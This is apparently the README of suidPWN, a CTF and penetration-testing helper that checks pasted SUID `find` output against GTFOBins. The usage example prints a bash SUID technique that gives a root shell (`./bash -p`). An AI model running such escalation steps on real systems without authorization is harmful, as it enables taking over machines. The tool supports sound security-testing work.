# suidPWN
Speeding up identifying which binaries with a SUID flag may lead to root access

# about
We made this tool while working and different CTF boxes.  
The reason was to fast identify SUID binaries which are vulnerable to an LPE.  
  
Usually when you are checking for SUID binaries on a target you get a lot binaries out of the `find` command. Then you may check every binary you do not know on `gtfobins`. With this approach it is easy to overlook a juicy binary.  
  
To avoid this, you can use suidPWN where you just have to paste your `find` output and it tells you if a binary is on `gtfobins` and vulnerable to privilege escalation.
  
All the credits for the local privilege escalation techniques go to `gtfobins`. These guys are awesome! <3  

# hints
- update the `binaries` files regulary
- when `suidPWN.py` identified a binary which allows privilege escalation, it scrapes the technique from `gtfobins` and stores it locally, so it does not have to scrape it again next time

# usage

## overview
```bash
python3 suidPWN.py -h
usage: suidPWN.py [-h] [-fd] [-f FILE] [-c]

Identify SUID binaries allowing privilege escalation. Tool made by H4&L0. Credits for LPE techniques to https://gtfobins.github.io/

optional arguments:
  -h, --help            show this help message and exit
  -fd, --find           print find suid binaries command
  -f FILE, --file FILE  read suid files result from file
  -c, --credits         show credits

example usage: python3 suidPWN.py
```

## updating the `binaries` file
```bash
$ python3 get_binaries_from_gtfobins.py
[*] Getting binary list from gtfobins...
[+] Done.
```

## practical example
```bash
$ python3 suidPWN.py
Paste your find output. When you are done press ctrl+d
-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
-rwsr-xr-x 1 root root 34896 Apr 22  2020 /usr/bin/fusermount
-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/bash
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /usr/sbin/unix_chkpwd
^D

[+] bash
[*] Getting bash escalation technique from gtfobins.github.io.
>
>	sudo install -m =xs $(which bash) .
>
>	./bash -p
>
>	source: https://gtfobins.github.io/gtfobins/bash
```
